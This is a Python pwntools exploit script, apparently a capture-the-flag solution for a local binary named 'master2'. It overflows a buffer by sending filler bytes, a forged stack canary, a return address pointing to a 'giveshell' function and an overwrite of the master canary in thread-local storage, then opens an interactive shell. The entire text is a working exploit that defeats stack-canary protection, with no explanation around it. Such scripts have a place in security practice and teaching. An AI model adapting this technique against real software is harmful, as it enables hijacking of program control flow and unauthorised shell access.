#!/usr/bin/python 
from pwn import *

p = process("./master2")
elf = ELF("./master2")
giveshell = elf.symbols['giveshell']

pay = 'A'*0x108
pay += "master12" #canary
pay += 'B'*8 #SFP
pay += p64(giveshell) #return address
pay += 'C'*0x7c8
pay += "master12" #master canary

p.sendlineafter("Size: ", str(len(pay)))
p.sendlineafter("Data: ", pay)

p.interactive()


